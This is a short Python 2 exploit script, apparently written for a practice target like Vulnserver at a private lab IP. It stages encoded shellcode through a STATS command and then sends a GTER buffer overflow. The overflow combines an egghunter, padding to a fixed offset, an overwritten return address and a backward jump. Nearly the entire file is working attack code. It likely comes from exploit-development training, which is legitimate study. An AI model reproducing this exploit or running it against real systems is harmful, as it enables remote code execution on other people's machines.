#!/usr/bin/python2

import socket
import sys

host = "10.10.12.239"
port = 9999

shellcode = (
"\xd9\xeb\xd9\x74\x24\xf4\xbd\x6d\x9b\x1e\x35\x58\x33\xc9\xb1"
"\x52\x31\x68\x17\x03\x68\x17\x83\xad\x9f\xfc\xc0\xd1\x48\x82"
"\x2b\x29\x89\xe3\xa2\xcc\xb8\x23\xd0\x85\xeb\x93\x92\xcb\x07"
"\x5f\xf6\xff\x9c\x2d\xdf\xf0\x15\x9b\x39\x3f\xa5\xb0\x7a\x5e"
"\x25\xcb\xae\x80\x14\x04\xa3\xc1\x51\x79\x4e\x93\x0a\xf5\xfd"
"\x03\x3e\x43\x3e\xa8\x0c\x45\x46\x4d\xc4\x64\x67\xc0\x5e\x3f"
"\xa7\xe3\xb3\x4b\xee\xfb\xd0\x76\xb8\x70\x22\x0c\x3b\x50\x7a"
"\xed\x90\x9d\xb2\x1c\xe8\xda\x75\xff\x9f\x12\x86\x82\xa7\xe1"
"\xf4\x58\x2d\xf1\x5f\x2a\x95\xdd\x5e\xff\x40\x96\x6d\xb4\x07"
"\xf0\x71\x4b\xcb\x8b\x8e\xc0\xea\x5b\x07\x92\xc8\x7f\x43\x40"
"\x70\x26\x29\x27\x8d\x38\x92\x98\x2b\x33\x3f\xcc\x41\x1e\x28"
"\x21\x68\xa0\xa8\x2d\xfb\xd3\x9a\xf2\x57\x7b\x97\x7b\x7e\x7c"
"\xd8\x51\xc6\x12\x27\x5a\x37\x3b\xec\x0e\x67\x53\xc5\x2e\xec"
"\xa3\xea\xfa\xa3\xf3\x44\x55\x04\xa3\x24\x05\xec\xa9\xaa\x7a"
"\x0c\xd2\x60\x13\xa7\x29\xe3\x16\x29\x22\x02\x4e\x4b\x44\xf5"
"\xd3\xc2\xa2\x9f\xfb\x82\x7d\x08\x65\x8f\xf5\xa9\x6a\x05\x70"
"\xe9\xe1\xaa\x85\xa4\x01\xc6\x95\x51\xe2\x9d\xc7\xf4\xfd\x0b"
"\x6f\x9a\x6c\xd0\x6f\xd5\x8c\x4f\x38\xb2\x63\x86\xac\x2e\xdd"
"\x30\xd2\xb2\xbb\x7b\x56\x69\x78\x85\x57\xfc\xc4\xa1\x47\x38"
"\xc4\xed\x33\x94\x93\xbb\xed\x52\x4a\x0a\x47\x0d\x21\xc4\x0f"
"\xc8\x09\xd7\x49\xd5\x47\xa1\xb5\x64\x3e\xf4\xca\x49\xd6\xf0"
"\xb3\xb7\x46\xfe\x6e\x7c\x66\x1d\xba\x89\x0f\xb8\x2f\x30\x52"
"\x3b\x9a\x77\x6b\xb8\x2e\x08\x88\xa0\x5b\x0d\xd4\x66\xb0\x7f"
"\x45\x03\xb6\x2c\x66\x06"
)

egghunter = (
'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a'
'\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7\xaf\x75\xea\xaf\x75\xe7'
'\xff\xe7'
)

buffer = egghunter
buffer += 'A' * (147 - len(buffer))
buffer += '\xaf\x11\x50\x62'
buffer += '\xe9\x64\xff\xff\xff'
buffer += 'D' * (1000 - len(buffer))


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send("STATS" + "hackhack" + shellcode)
s.recv(1024)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("[+] Sending Payloads")
s.send(bytes("GTER /.:/" + buffer))
print("[+] Done")
